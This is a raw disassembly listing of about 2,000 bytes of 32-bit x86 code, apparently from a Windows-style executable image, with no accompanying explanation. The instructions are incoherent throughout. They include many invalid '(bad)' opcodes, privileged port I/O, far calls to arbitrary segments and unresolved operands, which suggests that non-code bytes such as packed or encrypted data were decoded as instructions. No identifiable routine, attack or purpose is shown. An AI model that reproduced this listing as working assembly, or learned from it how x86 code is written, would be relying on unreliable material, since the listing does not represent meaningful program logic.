  40427e:	lock inc ebx
  404280:	out    dx,eax
  404281:	xor    ebp,DWORD PTR ds:0xf957ab8a
  404287:	sub    ch,BYTE PTR [eax]
  404289:	push   ss
  40428a:	(bad)  
  40428b:	test   al,0xcc
  40428d:	push   edi
  40428e:	out    dx,al
  40428f:	xchg   edi,eax
  404290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404291:	or     edi,DWORD PTR [ebx]
  404293:	and    al,0x51
  404295:	xor    cl,BYTE PTR [edi]
  404297:	xchg   ebp,eax
  404298:	jl     0x404304
  40429a:	dec    esi
  40429b:	aam    0x75
  40429d:	(bad)  [esi]
  40429f:	ss sub eax,0x769ca9da
  4042a5:	addr16 pop ebx
  4042a7:	xor    dl,dh
  4042a9:	jbe    0x40431f
  4042ab:	cmp    BYTE PTR [esi+0x7c],bh
  4042ae:	retf   
  4042af:	test   DWORD PTR [ecx+0x558fe8e],eax
  4042b5:	out    0x7e,eax
  4042b7:	inc    edi
  4042b8:	lea    ebx,[edi+0xa]
  4042bb:	sub    DWORD PTR [ecx],edi
  4042bd:	jl     0x40430e
  4042bf:	dec    ebp
  4042c0:	out    0x7a,al
  4042c2:	out    dx,al
  4042c3:	jne    0x404268
  4042c5:	push   ebx
  4042c6:	(bad)  
  4042c7:	jne    0x40425c
  4042c9:	fst    DWORD PTR [ebx+0x46]
  4042cc:	sub    eax,0xadfc8c4b
  4042d1:	lds    esi,FWORD PTR ds:0xcd163a6e
  4042d7:	loope  0x40432c
  4042d9:	dec    edx
  4042da:	shl    DWORD PTR [eax-0x18d3ce36],0xa3
  4042e1:	dec    edi
  4042e2:	les    ebx,FWORD PTR [eax+edi*4+0x70]
  4042e6:	fisub  WORD PTR [ebx]
  4042e8:	adc    DWORD PTR [eax],0x3a
  4042eb:	(bad)  
  4042ec:	retf   
  4042ed:	xchg   esp,eax
  4042ee:	sbb    eax,0x7a45ee39
  4042f3:	sbb    dh,BYTE PTR [ecx+0x5b]
  4042f6:	out    dx,eax
  4042f7:	scas   eax,DWORD PTR es:[edi]
  4042f8:	xchg   esp,eax
  4042f9:	loopne 0x4042a4
  4042fb:	push   edi
  4042fc:	fsubr  st,st(4)
  4042fe:	sti    
  4042ff:	dec    edi
  404300:	jns    0x40433f
  404302:	aad    0x90
  404304:	jb     0x4042ef
  404306:	je     0x4042a7
  404308:	push   edi
  404309:	(bad)
  40430c:	xchg   DWORD PTR [ebx-0x71],ebp
  40430f:	sti    
  404310:	ins    BYTE PTR es:[edi],dx
  404311:	in     eax,0x46
  404313:	mov    ah,0x45
  404315:	xlat   BYTE PTR ds:[ebx]
  404316:	push   es
  404317:	enter  0x5344,0xb3
  40431b:	xor    eax,0xdd347a42
  404320:	jno    0x4042a6
  404322:	mov    fs,WORD PTR [ebx-0x47324dd6]
  404328:	std    
  404329:	inc    esi
  40432a:	std    
  40432b:	xchg   edx,eax
  40432c:	cli    
  40432d:	stos   BYTE PTR es:[edi],al
  40432e:	pushf  
  40432f:	(bad)  
  404330:	dec    esi
  404331:	mov    al,ds:0x1ba1c2a8
  404336:	sbb    ecx,DWORD PTR [edi-0x6e]
  404339:	jle    0x4042df
  40433b:	jle    0x404373
  40433d:	pop    ebp
  40433e:	aaa    
  40433f:	ins    BYTE PTR es:[edi],dx
  404340:	xchg   ebx,eax
  404341:	shl    DWORD PTR [esi+0x531d8098],0xa0
  404348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404349:	and    eax,0xe5cd7ff6
  40434e:	sub    esp,DWORD PTR [edx-0x59]
  404351:	fcom   st(2)
  404353:	es and eax,0x9a4bb6f3
  404359:	cmp    DWORD PTR [edx-0x2],eax
  40435c:	nop
  40435d:	test   eax,edx
  40435f:	data16 das 
  404361:	and    eax,0xd987418e
  404366:	cmp    eax,0xa0c505d8
  40436b:	inc    eax
  40436c:	in     al,0x9b
  40436e:	pop    eax
  40436f:	paddsw mm5,QWORD PTR [esi]
  404372:	jecxz  0x40438b
  404374:	cmp    ah,ch
  404376:	out    dx,eax
  404377:	push   0x58f3ed38
  40437c:	adc    ebp,ecx
  40437e:	lock inc ebp
  404380:	or     BYTE PTR [edi+ebp*4+0x11563e4],bh
  404387:	std    
  404388:	pushf  
  404389:	push   0x99a65740
  40438e:	inc    edx
  40438f:	dec    esp
  404390:	rol    BYTE PTR [eax],cl
  404392:	test   al,0x82
  404394:	out    dx,eax
  404395:	out    0x39,eax
  404397:	lods   eax,DWORD PTR ds:[esi]
  404398:	shl    DWORD PTR [ecx],1
  40439a:	fstp   TBYTE PTR [ebx]
  40439c:	loope  0x404361
  40439e:	stos   BYTE PTR es:[edi],al
  40439f:	jb     0x4043ec
  4043a1:	imul   edx
  4043a3:	call   0x99b55729
  4043a8:	lds    ebx,FWORD PTR [ebx+0x5e86daf1]
  4043ae:	adc    al,0xf
  4043b0:	cmc    
  4043b1:	mov    dl,0x8f
  4043b3:	mov    esi,DWORD PTR [ebp-0x201117d5]
  4043b9:	gs dec esi
  4043bb:	pop    eax
  4043bc:	add    DWORD PTR [ebp-0x46],ecx
  4043bf:	pop    esi
  4043c0:	sti    
  4043c1:	aaa    
  4043c2:	mov    eax,ds:0xde0debe
  4043c7:	es push ebx
  4043c9:	stos   BYTE PTR es:[edi],al
  4043ca:	ins    BYTE PTR es:[edi],dx
  4043cb:	sbb    al,0xa2
  4043cd:	scas   al,BYTE PTR es:[edi]
  4043ce:	shl    DWORD PTR [ebx-0x7a],0x2f
  4043d2:	pextrw ebx,(bad),0xc5
  4043d4:	lahf   
  4043d5:	cmp    eax,0x145b95c1
  4043da:	or     BYTE PTR [esi+0x5d],cl
  4043dd:	popa   
  4043de:	test   DWORD PTR [esi+esi*8-0x6d8b21b0],esi
  4043e5:	cld    
  4043e6:	repnz jecxz 0x4043f0
  4043e9:	or     DWORD PTR [edi-0x5a],ebp
  4043ec:	push   edx
  4043ed:	jle    0x4043a4
  4043ef:	ret    0xf106
  4043f2:	push   cx
  4043f4:	fstp   QWORD PTR [ecx+ecx*4]
  4043f7:	in     al,0xd1
  4043f9:	(bad)  
  4043fa:	jb     0x4043a0
  4043fc:	iret   
  4043fd:	arpl   di,dx
  4043ff:	into   
  404400:	sar    edx,cl
  404402:	or     ecx,edx
  404404:	add    cl,bl
  404406:	gs xchg bl,bl
  404409:	sub    eax,0x537bdb6f
  40440e:	pusha  
  40440f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404410:	add    DWORD PTR [ecx+eax*1],ebp
  404413:	in     al,dx
  404414:	in     eax,0x54
  404416:	in     eax,dx
  404417:	jge    0x404440
  404419:	pop    ss
  40441a:	push   eax
  40441b:	int    0xcf
  40441d:	sbb    bh,BYTE PTR [edx]
  40441f:	mov    edx,0x22894565
  404424:	pushf  
  404425:	daa    
  404426:	mov    fs,WORD PTR [ecx+ebx*8]
  404429:	mov    al,ds:0x3b919a19
  40442e:	jb     0x4043eb
  404430:	push   cs
  404431:	pop    ebx
  404432:	addr16 fwait
  404434:	fwait
  404435:	add    al,0xf8
  404437:	sub    cl,BYTE PTR [ebx+0x3f]
  40443a:	stos   BYTE PTR es:[edi],al
  40443b:	adc    DWORD PTR [eax],edi
  40443d:	push   ds
  40443e:	push   esp
  40443f:	dec    edi
  404440:	hlt    
  404441:	or     edx,ebp
  404443:	pushf  
  404444:	adc    esp,DWORD PTR [edx+0x72]
  404447:	mov    BYTE PTR [ecx+0x255221f0],bh
  40444d:	adc    esi,esp
  40444f:	bound  edi,QWORD PTR [ebx-0x48]
  404452:	lahf   
  404453:	add    eax,0x865878e6
  404458:	dec    esi
  404459:	inc    ebp
  40445a:	dec    esp
  40445b:	pop    esi
  40445c:	push   esp
  40445d:	test   al,0xe3
  40445f:	jge    0x4043f8
  404461:	mov    bl,ah
  404463:	and    edi,ecx
  404465:	outs   dx,DWORD PTR ds:[esi]
  404466:	ja     0x404441
  404468:	in     eax,dx
  404469:	mov    eax,0x1145382f
  40446e:	cmp    al,0xd3
  404470:	mov    ?,WORD PTR [ebp-0x61e32da]
  404476:	xchg   esp,eax
  404477:	adc    esi,DWORD PTR [edx-0x4fd51e78]
  40447d:	fimul  WORD PTR [edx-0x2123c9b3]
  404483:	mov    esp,ebx
  404485:	sahf   
  404486:	cdq    
  404487:	jne    0x4044e1
  404489:	add    eax,0x1d1674e0
  40448e:	sbb    edx,edx
  404490:	adc    BYTE PTR [edx+ebp*4-0x10df66d4],dh
  404497:	cmp    ebp,edi
  404499:	adc    eax,0x99385628
  40449e:	test   DWORD PTR [esi+eiz*4-0x10af564],0x480ebb45
  4044a9:	xchg   ecx,eax
  4044aa:	scas   al,BYTE PTR es:[edi]
  4044ab:	mov    DWORD PTR [edx-0x69],ebx
  4044ae:	aas    
  4044af:	push   ecx
  4044b0:	push   0x2c
  4044b2:	xchg   edx,eax
  4044b3:	neg    DWORD PTR [eax]
  4044b5:	ret    0xdb6d
  4044b8:	push   DWORD PTR [eax]
  4044ba:	cmp    eax,0x9e6b4830
  4044bf:	inc    ebx
  4044c0:	jl     0x40453e
  4044c2:	adc    DWORD PTR [eax-0x635eb631],ebp
  4044c8:	mov    ecx,0x9d28728e
  4044cd:	lock test al,0x99
  4044d0:	ja     0x404518
  4044d2:	ret    
  4044d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044d5:	cli    
  4044d6:	xor    dh,BYTE PTR [ecx]
  4044d8:	push   0x59
  4044da:	and    DWORD PTR [edi],esp
  4044dc:	fisubr DWORD PTR [eax-0x7a030a31]
  4044e2:	xor    eax,DWORD PTR [esi+0x6b44aec2]
  4044e8:	push   0x7926b74b
  4044ed:	rol    BYTE PTR [esi-0x3f],0x34
  4044f1:	and    DWORD PTR [eax-0x1c],ebx
  4044f4:	sub    esi,DWORD PTR [ecx]
  4044f6:	lock loope 0x40447f
  4044f9:	ds push eax
  4044fc:	mov    DWORD PTR cs:[eax+ebp*8],edi
  404500:	scas   al,BYTE PTR es:[edi]
  404501:	push   cs
  404502:	cld    
  404503:	lods   eax,DWORD PTR ds:[esi]
  404504:	test   BYTE PTR [ecx-0x3c],bl
  404507:	inc    ecx
  404508:	jo     0x4044b2
  40450a:	mov    BYTE PTR [edx+0x45e761d7],bl
  404510:	ins    DWORD PTR es:[edi],dx
  404511:	adc    al,0xa5
  404513:	inc    edx
  404514:	in     al,0x7
  404516:	lea    ecx,[edx-0x67]
  404519:	pop    ebp
  40451a:	in     al,dx
  40451b:	shl    DWORD PTR [eax],0xa
  40451e:	fistp  DWORD PTR [ebx-0x74424a91]
  404524:	inc    eax
  404525:	inc    edx
  404526:	mov    al,ds:0xb01bc13
  40452b:	cmp    BYTE PTR [eax],0x3e
  40452e:	je     0x40458e
  404530:	mov    dl,0xf8
  404532:	in     al,dx
  404533:	data16 repnz stos BYTE PTR es:[edi],al
  404536:	push   eax
  404537:	test   DWORD PTR [ebx-0x27],edx
  40453a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40453b:	mov    ah,0x44
  40453d:	mov    al,0x2e
  40453f:	jg     0x404515
  404541:	rcr    DWORD PTR [edx-0x65],0x8c
  404545:	bnd jnp 0x404584
  404548:	xchg   BYTE PTR [esi],al
  40454a:	call   0xdeb79736
  40454f:	dec    edx
  404550:	out    0x25,al
  404552:	inc    esi
  404553:	jecxz  0x404515
  404555:	mov    edi,0xa598c910
  40455a:	dec    edi
  40455b:	cli    
  40455c:	jmp    0xce3a090e
  404561:	mov    bh,0xe9
  404563:	add    eax,0x5e00fafe
  404568:	aad    0xb4
  40456a:	clc    
  40456b:	add    bl,BYTE PTR [edi]
  40456d:	cmp    ebx,ebx
  40456f:	add    BYTE PTR [ebp-0x4b82db9e],0x2d
  404576:	mov    dh,al
  404578:	es push 0x15
  40457b:	add    al,0xcc
  40457d:	xor    bh,ch
  40457f:	mov    ds:0xbce30736,al
  404584:	sub    al,0x9c
  404586:	jg     0x4045f8
  404588:	pop    es
  404589:	pop    eax
  40458a:	loope  0x4045da
  40458c:	xor    eax,0x43dd57fd
  404591:	pop    ebp
  404592:	in     al,dx
  404593:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404594:	sub    edx,DWORD PTR [ebp-0x6c]
  404597:	lea    esp,[ecx-0x4d]
  40459a:	aam    0x60
  40459c:	cmp    esi,DWORD PTR [ebp-0x2e433335]
  4045a2:	das    
  4045a3:	nop
  4045a4:	loopne 0x40456e
  4045a6:	jg     0x404575
  4045a8:	out    dx,al
  4045a9:	adc    bl,BYTE PTR [esp+edi*4]
  4045ac:	popf   
  4045ad:	xlat   BYTE PTR ds:[ebx]
  4045ae:	inc    ebx
  4045af:	cmp    al,0xbb
  4045b1:	pop    edi
  4045b2:	mov    edi,0xf9d3b655
  4045b7:	push   ecx
  4045b8:	cmp    ebp,DWORD PTR [eax]
  4045ba:	sti    
  4045bb:	into   
  4045bc:	jns    0x404600
  4045be:	fst    QWORD PTR [ecx+0x2161ca90]
  4045c4:	mov    cl,0x3e
  4045c6:	push   es
  4045c7:	adc    dl,BYTE PTR [esi]
  4045c9:	adc    eax,0x3b684568
  4045ce:	pop    es
  4045cf:	(bad)  
  4045d0:	pop    esp
  4045d1:	idiv   DWORD PTR [ecx-0x48e4a787]
  4045d7:	fsub   DWORD PTR [edx+0x48]
  4045da:	(bad)  [edx+0x5b]
  4045dd:	add    DWORD PTR ds:0x29b23bb5,esi
  4045e3:	push   0x50b796a7
  4045e8:	jmp    0x6f413536
  4045ed:	pop    es
  4045ee:	xlat   BYTE PTR ds:[ebx]
  4045ef:	inc    ebx
  4045f0:	push   ss
  4045f1:	jmp    0x4045e4
  4045f3:	jmp    0x404596
  4045f5:	mov    al,ah
  4045f7:	dec    esp
  4045f8:	and    al,0xd6
  4045fa:	aam    0x29
  4045fc:	mov    BYTE PTR [eax-0x557354de],ah
  404602:	jle    0x4045d0
  404604:	(bad)  
  404606:	dec    ecx
  404607:	loope  0x404611
  404609:	cmp    ah,ch
  40460b:	aad    0x14
  40460d:	sbb    ebp,DWORD PTR [edx-0x33]
  404610:	js     0x4045ee
  404612:	loop   0x40467d
  404614:	xor    edx,DWORD PTR [eax+0x17]
  404617:	test   BYTE PTR [esi-0x7ea8cdce],0xc3
  40461e:	rcr    DWORD PTR [ebx+0x58efdf9c],1
  404624:	call   0x7553:0xba1417db
  40462b:	sbb    al,dh
  40462d:	or     ebp,DWORD PTR ss:[edi+0x2b4f05ca]
  404634:	sbb    al,0x1d
  404636:	sahf   
  404637:	xlat   BYTE PTR ds:[ebx]
  404638:	loope  0x40469d
  40463a:	dec    esp
  40463b:	pusha  
  40463c:	dec    ebp
  40463d:	mov    al,0x6
  40463f:	stos   BYTE PTR es:[edi],al
  404640:	pop    ds
  404641:	mov    ebp,0x426c7b58
  404646:	jno    0x4045fd
  404648:	jbe    0x4045f0
  40464a:	mov    ?,WORD PTR [edi-0x7ae573f3]
  404650:	mov    dh,0x7
  404652:	ins    DWORD PTR es:[edi],dx
  404653:	je     0x4046cd
  404655:	mov    ebx,0xb249dbd1
  40465a:	pushf  
  40465b:	inc    ebp
  40465c:	push   esp
  40465d:	jo     0x404657
  40465f:	pop    ds
  404660:	jmp    0x86236b31
  404665:	xchg   edx,eax
  404666:	inc    edx
  404667:	dec    esi
  404668:	adc    esi,DWORD PTR [eax-0x130a137]
  40466e:	sti    
  40466f:	jae    0x404680
  404671:	lods   al,BYTE PTR ds:[esi]
  404672:	outs   dx,BYTE PTR ds:[esi]
  404673:	jmp    0x2cccb1d4
  404678:	inc    ebp
  404679:	mov    ds:0xca5b527d,eax
  40467e:	sub    ebx,esi
  404680:	add    al,ch
  404682:	cmp    al,0xe6
  404684:	or     DWORD PTR [edx+0xf],ebx
  404687:	sbb    BYTE PTR ds:0x3b1d81,cl
  40468d:	fstp   QWORD PTR [edx-0x7110b6c5]
  404693:	(bad)  
  404694:	fxch   st(6)
  404696:	mov    esi,0x7102cc66
  40469b:	jecxz  0x4046ff
  40469d:	and    cl,BYTE PTR [edi-0x4850aadd]
  4046a3:	repnz pop edx
  4046a5:	int3   
  4046a6:	adc    eax,0xb7397d31
  4046ab:	call   0x1a20:0xed179e1f
  4046b2:	or     BYTE PTR ds:0x6d908860,dl
  4046b8:	push   edi
  4046b9:	jge    0x404689
  4046bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046bc:	inc    ebp
  4046bd:	mov    bh,0x22
  4046bf:	fld    QWORD PTR [eax-0x33]
  4046c2:	ss int3 
  4046c4:	sub    BYTE PTR [ecx-0x7c],al
  4046c7:	int3   
  4046c8:	scas   al,BYTE PTR es:[edi]
  4046c9:	and    esi,DWORD PTR [ebp-0xb]
  4046cc:	(bad)  
  4046cd:	imul   edx,DWORD PTR [edi],0xd09e870
  4046d3:	sbb    al,0x1a
  4046d5:	int3   
  4046d6:	popa   
  4046d7:	mov    ds:0xe9af8c43,eax
  4046dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046dd:	add    cl,BYTE PTR [edi]
  4046df:	imul   edx,DWORD PTR [edx-0x56],0xffffff9e
  4046e3:	test   eax,0x44fd71d2
  4046e8:	mov    edx,ss
  4046ea:	iret   
  4046eb:	push   ebx
  4046ec:	jmp    0x79b172e0
  4046f1:	sub    eax,DWORD PTR [esi+0x22d55532]
  4046f7:	loope  0x4046a6
  4046f9:	xchg   BYTE PTR [ecx-0x16890f02],ah
  4046ff:	sar    BYTE PTR [edx+0x6a],1
  404702:	gs xchg esp,eax
  404704:	jge    0x40473b
  404706:	icebp  
  404707:	push   edx
  404708:	ret    0xc93f
  40470b:	jg     0x4046b6
  40470d:	ds dec ebp
  40470f:	je     0x4046f7
  404711:	jmp    0x472e4144
  404716:	mov    edx,0x15bb5dd
  40471b:	sahf   
  40471c:	fmul   st,st(6)
  40471e:	sbb    DWORD PTR [ecx+ebp*4+0x61],ecx
  404722:	jb     0x4046f1
  404724:	call   0xb78c:0x79d26937
  40472b:	inc    ebp
  40472c:	push   ebp
  40472d:	aad    0x98
  40472f:	fdivr  QWORD PTR [esi]
  404731:	aaa    
  404732:	into   
  404733:	dec    ebx
  404734:	push   edx
  404735:	out    0x18,al
  404737:	jmp    0xa5e4a3a5
  40473c:	add    DWORD PTR [ebp-0x6b],0x7d
  404740:	xchg   edi,eax
  404741:	dec    ecx
  404742:	sub    eax,0xb0171cdd
  404747:	push   0x5d131faf
  40474c:	mov    al,0x88
  40474e:	(bad)
  404751:	mov    ds:0xd277a321,eax
  404756:	jl     0x404720
  404758:	div    DWORD PTR [edx+ebp*1-0x4c]
  40475c:	test   eax,0x726a8b7e
  404761:	mov    ds:0xefc9752c,eax
  404766:	and    bh,0xa2
  404769:	stos   DWORD PTR es:[edi],eax
  40476a:	or     DWORD PTR [edx+0x2],eax
  40476d:	stos   BYTE PTR es:[edi],al
  40476e:	out    dx,al
  40476f:	nop
  404770:	mov    fs,WORD PTR [ebx-0x59]
  404773:	add    eax,0x9b5077f3
  404778:	pusha  
  404779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40477a:	fimul  WORD PTR [esi]
  40477c:	in     eax,0x9f
  40477e:	js     0x40470f
  404780:	bound  ebx,QWORD PTR [esi+0x4c]
  404783:	mov    al,ds:0x94b08dcd
  404788:	cmp    BYTE PTR [edx],ah
  40478a:	mov    ah,0xfa
  40478c:	arpl   WORD PTR [ecx+esi*4],ax
  40478f:	out    dx,eax
  404790:	test   BYTE PTR [ecx+esi*2],ah
  404793:	fistp  WORD PTR [ebx+0x68]
  404796:	inc    esp
  404797:	ins    BYTE PTR es:[edi],dx
  404798:	std    
  404799:	jle    0x4047b0
  40479b:	mov    edx,0x76993764
  4047a0:	pop    esp
  4047a1:	cmp    al,0xe2
  4047a3:	xor    BYTE PTR [esi],dh
  4047a5:	cdq    
  4047a6:	ja     0x4047de
  4047a8:	mov    ds,WORD PTR ss:[edx+0x9]
  4047ac:	adc    al,BYTE PTR [eax-0x41a42a]
  4047b2:	xchg   ebx,eax
  4047b3:	mov    BYTE PTR [esi+0x30e5fe30],0x2e
  4047ba:	push   esp
  4047bb:	call   0x205244a5
  4047c0:	in     al,dx
  4047c1:	data16 or al,0x79
  4047c4:	rcr    DWORD PTR [esi],0xc5
  4047c7:	push   0xffffffba
  4047c9:	mov    eax,0x655f15a9
  4047ce:	mov    dl,0xf8
  4047d0:	or     edi,DWORD PTR [edi+0x14c2d5cf]
  4047d6:	sub    al,ch
  4047d8:	xchg   ebp,eax
  4047d9:	pop    ebp
  4047da:	out    dx,al
  4047db:	push   eax
  4047dc:	or     esp,ebp
  4047de:	arpl   WORD PTR [eax],di
  4047e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047e1:	push   ds
  4047e2:	push   ss
  4047e3:	xor    al,bh
  4047e5:	mov    al,0xa5
  4047e7:	mul    ebp
  4047e9:	retf   0x6942
  4047ec:	(bad)  
  4047ed:	dec    esp
  4047ee:	fimul  WORD PTR [esi-0x26]
  4047f1:	cmp    BYTE PTR ds:0x3e1933cf,0x15
  4047f8:	jl     0x404834
  4047fa:	xchg   edx,eax
  4047fb:	leave  
  4047fc:	mov    ch,0x37
  4047fe:	fwait
  4047ff:	cmp    eax,0xd1001f80
  404804:	cmp    cl,BYTE PTR [esi+ebx*4-0x47]
  404808:	xor    BYTE PTR [edi],bl
  40480a:	mov    edi,0xf208e7bd
  40480f:	retf   0xf83
  404812:	fldl2t 
  404814:	jne    0x404846
  404816:	push   esp
  404817:	dec    edx
  404818:	mov    BYTE PTR [eax],ch
  40481a:	addr16 aad 0x82
  40481d:	neg    ah
  40481f:	mov    al,BYTE PTR [ebp+0x43c6b246]
  404825:	cmc    
  404826:	sub    eax,0x6f485467
  40482b:	mov    WORD PTR [ecx-0x3bb47637],fs
  404831:	sti    
  404832:	js     0x40481b
  404834:	xchg   ebp,eax
  404835:	dec    edx
  404836:	mov    BYTE PTR [ebp+0x51],ch
  404839:	test   esp,ebp
  40483b:	xor    al,0xd5
  40483d:	scas   al,BYTE PTR es:[edi]
  40483e:	outs   dx,BYTE PTR ds:[esi]
  40483f:	dec    ebx
  404840:	(bad)  
  404842:	ror    cl,1
  404844:	mov    ecx,0xdf252d42
  404849:	pop    edi
  40484a:	pop    ecx
  40484b:	dec    edi
  40484c:	mov    al,ds:0xe19df16e
  404851:	lods   eax,DWORD PTR ds:[esi]
  404852:	repnz mov ax,0xde44
  404857:	hlt    
  404858:	neg    BYTE PTR [ecx-0x5]
  40485b:	ss in  eax,dx
  40485d:	hlt    
  40485e:	outs   dx,BYTE PTR ds:[esi]
  40485f:	arpl   di,di
  404861:	addr16 sbb ebp,ecx
  404864:	out    0x80,al
  404866:	(bad)  
  404867:	mov    ds:0xe40a999a,al
  40486c:	icebp  
  40486d:	retf   
  40486e:	pop    es
  40486f:	ins    DWORD PTR es:[edi],dx
  404870:	or     edi,DWORD PTR [eax]
  404872:	ss inc esi
  404874:	cmp    DWORD PTR [ebx+0x1],esi
  404877:	xchg   edi,eax
  404878:	adc    ch,BYTE PTR gs:[ebx+0x48]
  40487c:	mov    edi,0xd23fab93
  404881:	pop    edx
  404882:	jmp    0xcf1c1787
  404887:	iret   
  404888:	inc    eax
  404889:	mov    bl,0x88
  40488b:	nop
  40488c:	cld    
  40488d:	out    dx,al
  40488e:	js     0x4048cd
  404890:	adc    ah,dl
  404892:	push   ss
  404893:	push   ebp
  404894:	sub    cl,0xe1
  404897:	inc    esi
  404898:	je     0x40488e
  40489a:	cs jl  0x404825
  40489d:	xor    eax,DWORD PTR [edi]
  40489f:	dec    esi
  4048a0:	popa   
  4048a1:	loopne 0x40486b
  4048a3:	cmc    
  4048a4:	(bad)  
  4048a6:	mov    edi,0xdd97159f
  4048ab:	push   0xbecf06eb
  4048b0:	mov    dh,0xb8
  4048b2:	(bad)  
  4048b3:	mov    dh,0xea
  4048b5:	pushf  
  4048b6:	rol    bl,0x3e
  4048b9:	sub    ebp,DWORD PTR [esi]
  4048bb:	add    al,0xc9
  4048bd:	test   DWORD PTR ds:[edi-0x12],edx
  4048c1:	mov    WORD PTR [ebp+0x4e],?
  4048c4:	adc    ebx,DWORD PTR [ebp+0x64]
  4048c7:	cmp    DWORD PTR [edi-0x1624b8ae],edi
  4048cd:	xchg   ecx,eax
  4048ce:	dec    eax
  4048cf:	add    al,0x13
  4048d1:	sub    DWORD PTR [ecx+0x5a],edi
  4048d4:	pushf  
  4048d5:	add    bl,BYTE PTR [edi-0x78f5bd9a]
  4048db:	hlt    
  4048dc:	jp     0x4048bf
  4048de:	fincstp 
  4048e0:	dec    esp
  4048e1:	into   
  4048e2:	pop    ebp
  4048e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048e4:	scas   eax,DWORD PTR es:[edi]
  4048e5:	sbb    BYTE PTR [eax-0xf],dl
  4048e8:	dec    ecx
  4048e9:	push   ss
  4048ea:	mov    eax,0x533742d6
  4048ef:	mov    ebp,0x896c0739
  4048f4:	ret    
  4048f5:	inc    esi
  4048f6:	ror    bl,1
  4048f8:	int3   
  4048f9:	adc    dh,ch
  4048fb:	out    dx,eax
  4048fc:	aad    0xa6
  4048fe:	rcr    DWORD PTR [ebx+edx*1-0x52a6c381],cl
  404905:	jp     0x404908
  404907:	add    DWORD PTR [ebp+0x1e],ebx
  40490a:	loope  0x4048a1
  40490c:	out    0x4c,al
  40490e:	mov    bh,BYTE PTR [ebx-0x2c]
  404911:	lds    edx,FWORD PTR [eax-0x6f]
  404914:	and    al,0xf4
  404916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404917:	js     0x4048f6
  404919:	add    al,0xf8
  40491b:	dec    esp
  40491c:	in     al,0x8f
  40491e:	shl    BYTE PTR ds:0x92813f97,0x7e
  404925:	cmp    al,0xd6
  404927:	arpl   WORD PTR [ebx-0x35c707a7],di
  40492d:	and    al,BYTE PTR [esi]
  40492f:	in     al,dx
  404930:	cwde   
  404931:	sbb    DWORD PTR [ecx-0x700dafbb],edx
  404937:	dec    esi
  404938:	loopne 0x4048f4
  40493a:	(bad)  
  40493b:	mov    al,0x69
  40493d:	add    BYTE PTR [edx-0xc2d6409],al
  404943:	shl    dh,cl
  404945:	fsubr  st,st(3)
  404947:	cmp    BYTE PTR [ebp-0x8103229],ah
  40494d:	loop   0x404956
  40494f:	jb     0x4048e7
  404951:	ds out 0xc2,al
  404954:	lock lea edx,[eax+edx*8]
  404958:	ret    
  404959:	sbb    DWORD PTR [ecx-0x40],esi
  40495c:	fild   QWORD PTR [esp+ecx*1+0x275dfdfb]
  404963:	pop    ss
  404964:	je     0x4049bc
  404966:	jae    0x404993
  404968:	in     eax,dx
  404969:	ret    0x4123
  40496c:	cli    
  40496d:	mov    eax,0xb217381
  404972:	inc    esi
  404973:	pop    ebp
  404974:	loope  0x4049e5
  404976:	bound  ebp,QWORD PTR [edx]
  404978:	pusha  
  404979:	jno    0x40497c
  40497b:	aad    0xc8
  40497d:	jo     0x40491e
  40497f:	(bad)
  404982:	mov    edi,0xbaffa564
  404987:	push   edi
  404988:	inc    cx
  40498a:	mov    ebx,0xcad8b697
  40498f:	call   0xa731:0x25261dd5
  404996:	push   ebx
  404997:	jo     0x4049e6
  404999:	call   0x2aae:0xccca278
  4049a0:	mov    ch,0x1e
  4049a2:	jae    0x4049de
  4049a4:	aad    0x4f
  4049a6:	lds    esi,FWORD PTR [ecx-0x39]
  4049a9:	in     eax,dx
  4049aa:	(bad)
  4049af:	gs f2xm1 
  4049b2:	mov    edx,0x9f702fc5
  4049b7:	xor    bh,bl
  4049b9:	inc    eax
  4049ba:	repnz adc cl,BYTE PTR [esi+0x2d2408a5]
  4049c1:	mov    BYTE PTR [ecx],dh
  4049c3:	xlat   BYTE PTR ds:[ebx]
  4049c4:	popa   
  4049c5:	das    
  4049c6:	add    ch,BYTE PTR [ebx-0x1e]
  4049c9:	push   0x758bdde8
  4049ce:	stos   DWORD PTR es:[edi],eax
  4049cf:	jmp    DWORD PTR ds:0xfebe4f8a
  4049d5:	sbb    dl,bh
  4049d7:	retf   0x1b6f
  4049da:	std    
  4049db:	js     0x404a00
  4049dd:	push   ecx
  4049de:	sub    bh,BYTE PTR [ebx]
  4049e0:	fcom   st(5)
  4049e2:	jo     0x40496e
  4049e4:	add    ebx,DWORD PTR [di-0x1cc6]
  4049e9:	data16 test BYTE PTR [ecx+ecx*4],ch
  4049ed:	les    edx,FWORD PTR [ecx-0x59]
  4049f0:	dec    bx
  4049f2:	xor    ch,BYTE PTR [edx]
  4049f4:	neg    bh
  4049f6:	add    BYTE PTR [ebx+0x55],ch
  4049f9:	into   
  4049fa:	xchg   ebx,eax
  4049fb:	xor    ch,BYTE PTR [esi+0x16410f6f]
  404a01:	pop    esi
  404a02:	jge    0x404a1f
  404a04:	aaa    
  404a05:	(bad)  [eax-0x7e]
  404a08:	stos   BYTE PTR es:[edi],al
  404a09:	fnstenv [ebp-0x4078f11a]
  404a0f:	or     eax,0xac06ef64
  404a14:	add    eax,0xb09383c4
  404a19:	ss dec esp
  404a1b:	and    DWORD PTR [edi],0x180ac8c5
  404a21:	add    BYTE PTR [ebx-0x7f64a6e2],ch
  404a27:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  404a29:	pop    ss
  404a2a:	cdq    
  404a2b:	adc    ah,BYTE PTR [ebp-0x50]
  404a2e:	sbb    edx,DWORD PTR [edx+0x7f]
  404a31:	inc    eax
  404a32:	call   0xa247695c
  404a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a38:	mov    esp,0x5447ba6a
  404a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a3e:	fsubr  st,st(7)
